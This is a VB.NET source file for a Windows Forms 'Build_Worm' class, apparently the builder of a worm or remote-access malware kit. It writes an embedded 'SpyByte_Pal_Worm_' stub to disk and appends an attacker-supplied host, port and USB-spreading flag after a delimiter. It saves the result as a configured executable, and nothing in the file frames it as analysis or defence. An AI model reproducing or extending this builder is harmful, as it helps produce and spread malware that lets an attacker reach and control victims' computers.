Imports System.IO

Public Class Build_Worm

    Dim stub, text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim ex As Exception
    Dim s As New SaveFileDialog
    Sub start_worm()
        If TextBox1.Text = "" Or TextBox2.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port  ", MsgBoxStyle.Critical, "Create Server")
        Else

            s.ShowDialog()
            If s.FileName > "" Then
                text1 = TextBox1.Text
                text2 = TextBox2.Text

                Dim temp As String = IO.Path.GetTempPath() & "Stub.exe"

                File.WriteAllBytes(temp, My.Resources.SpyByte_Pal_Worm_)
                Dim path As String = IO.Path.GetDirectoryName(s.FileName) & "\"
                Dim savename As String = s.FileName.Replace(path, "")

                FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
                stub = Space(LOF(1))
                FileGet(1, stub)
                FileClose(1)
                FileOpen(1, s.FileName & ".exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
                FilePut(1, stub & spl & text1 & spl & text2 & spl & usb.CheckState)
                FileClose(1)

            Else
                MsgBox(ex.Message, MsgBoxStyle.Critical)
            End If
        End If
    End Sub

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        start_worm()
    End Sub
End Class